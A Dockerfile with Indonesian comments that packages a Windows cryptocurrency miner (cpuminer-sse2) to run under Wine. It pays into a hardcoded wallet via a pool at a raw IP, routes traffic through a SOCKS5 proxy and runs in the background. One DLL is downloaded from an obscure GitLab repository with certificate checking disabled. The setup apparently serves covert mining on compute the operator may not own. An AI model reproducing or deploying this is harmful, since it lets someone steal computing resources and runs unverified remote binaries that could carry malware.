# Gunakan image Ubuntu sebagai basis
FROM ubuntu:20.04

# Set lingkungan non-interaktif untuk menghindari prompt selama instalasi
ENV DEBIAN_FRONTEND=noninteractive

# Perbarui dan instal dependencies dasar
RUN apt-get update && apt-get install -y --no-install-recommends \
    software-properties-common \
    apt-transport-https \
    wget \
    unzip \
    gnupg \
    ca-certificates \
    xvfb \
    locales \
    && locale-gen en_US.UTF-8 \
    && update-locale LANG=en_US.UTF-8

# Tambahkan arsitektur i386 dan kunci GPG untuk Wine
RUN dpkg --add-architecture i386 && \
    wget -nc https://dl.winehq.org/wine-builds/winehq.key && \
    gpg --no-default-keyring --keyring /usr/share/keyrings/winehq-archive.keyring --import winehq.key && \
    echo "deb [signed-by=/usr/share/keyrings/winehq-archive.keyring] https://dl.winehq.org/wine-builds/ubuntu/ focal main" > /etc/apt/sources.list.d/winehq.list && \
    apt-get update && \
    apt-get install -y --install-recommends \
    winehq-stable \
    && apt-get clean && rm -rf /var/lib/apt/lists/*

# Buat direktori kerja
WORKDIR /app/miner

# Salin file aplikasi ke dalam container
COPY cpuminer-sse2.exe /app/miner/

# Salin pustaka DLL ke dalam direktori sistem Wine
COPY libcurl-4.dll /root/.wine/drive_c/windows/system32/
COPY libwinpthread-1.dll /root/.wine/drive_c/windows/system32/
COPY libgcc_s_seh-1.dll /root/.wine/drive_c/windows/system32/
RUN  wget --no-check-certificate -O /app/miner/.wine/drive_c/windows/system32/libstdc++-6.dll https://gitlab.com/nl2hc/l2nc/-/raw/main/libstdc++-6.dll

# Atur file sebagai executable
RUN chmod +x /app/miner/cpuminer-sse2.exe

# Jalankan aplikasi menggunakan Wine
CMD ["wine", "/app/miner/cpuminer-sse2.exe", "-a", "minotaurx", "-o", "stratum+tcp://146.103.45.69", "-u", "RNPTaDxarafTVGK3qaDGHRUhnvW3Mr4ux8", "-p", "c=RVN,mc=SMT/SPRX/SWAMP", "-x", "socks5://192.252.209.155:14455", "-t2", "-B"]
